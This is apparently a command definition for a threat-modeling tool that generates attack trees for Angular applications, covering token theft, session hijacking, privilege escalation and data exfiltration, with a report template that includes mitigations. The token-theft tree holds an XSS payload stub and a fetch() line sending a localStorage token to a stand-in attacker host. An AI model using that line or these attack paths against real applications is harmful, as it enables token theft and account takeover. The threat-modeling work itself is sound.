---
description: Generate attack trees for threat modeling
---

# Attack Tree Generator

Generate detailed attack trees for specific security threats in Angular applications.

## Attack Tree Structure

```
Goal: [Ultimate attacker objective]
│
├── [OR] Attack Vector 1
│   ├── Precondition A
│   │   └── Exploit Step 1
│   │       └── Exploit Step 2
│   └── Precondition B
│       └── Alternative path
│
├── [OR] Attack Vector 2
│   └── [AND] All required
│       ├── Requirement 1
│       └── Requirement 2
│
└── [OR] Attack Vector 3
    └── Direct exploit
```

## Common Attack Goals

### Token Theft
```
Goal: Steal User's Authentication Token
├── [OR] XSS Attack
│   ├── DOM-based XSS
│   │   ├── Find innerHTML sink
│   │   ├── Inject payload: <img src=x onerror="...">
│   │   └── Exfiltrate: fetch('https://attacker.com?t='+localStorage.getItem('token'))
│   ├── Reflected XSS
│   │   ├── Find URL parameter reflection
│   │   ├── Craft malicious URL
│   │   └── Social engineer victim to click
│   └── Stored XSS
│       ├── Submit malicious content
│       └── Content rendered to other users
├── [OR] Insecure Storage
│   ├── Token in localStorage
│   │   └── Any XSS → token access
│   └── Token in URL
│       └── Referrer header leakage
└── [OR] Network Attack
    ├── [AND] Man-in-the-Middle
    │   ├── No HTTPS
    │   └── Intercept token
    └── DNS hijacking
```

### Session Hijacking
```
Goal: Take Over User's Session
├── [OR] Token Theft (see above)
├── [OR] Session Fixation
│   ├── Set session before auth
│   └── User authenticates with attacker's session
└── [OR] CSRF + Session Riding
    ├── User is authenticated
    ├── Attacker's page loaded
    └── Malicious request sent with cookies
```

### Privilege Escalation
```
Goal: Gain Admin Access
├── [OR] Token Manipulation
│   ├── JWT in localStorage
│   ├── Decode and modify role claim
│   └── Re-encode (if no signature validation)
├── [OR] Client-Side Bypass
│   ├── Find client-only role check
│   └── Modify JavaScript/localStorage
└── [OR] Parameter Tampering
    ├── Find role parameter in request
    └── Change role=user to role=admin
```

### Data Exfiltration
```
Goal: Steal Sensitive User Data
├── [OR] XSS Data Access
│   ├── Access DOM content
│   ├── Read localStorage
│   └── Send to attacker server
├── [OR] API Abuse
│   ├── Find data endpoint
│   └── Access without authorization
└── [OR] Console Logging
    ├── Sensitive data logged
    └── Browser extension captures
```

## Output Format

```markdown
# Attack Tree: [Goal]

## Overview
- **Target:** [Component/Feature]
- **Attacker Profile:** [External/Internal/Privileged]
- **Prerequisites:** [What attacker needs]

## Attack Tree

[ASCII tree diagram]

## Attack Paths Analysis

### Path 1: [Name]
- **Likelihood:** High/Medium/Low
- **Impact:** Critical/High/Medium/Low
- **Complexity:** Easy/Moderate/Difficult
- **Steps:**
  1. [Step details]
  2. [Step details]
- **Indicators of Compromise:**
  - [What to monitor]
- **Mitigations:**
  - [Controls to prevent]

### Path 2: [Name]
[...]

## Risk Matrix

| Path | Likelihood | Impact | Risk Score |
|------|------------|--------|------------|
| 1 | High | Critical | Critical |
| 2 | Medium | High | High |

## Recommended Controls
1. [Prioritized mitigation]
2. [...]
```

## Usage

```
/generate-attack-tree [goal description]
```

Examples:
```
/generate-attack-tree Steal JWT token from Angular app using localStorage
/generate-attack-tree Perform CSRF attack against money transfer feature
/generate-attack-tree Escalate from user to admin role
/generate-attack-tree Exfiltrate credit card data via XSS
```
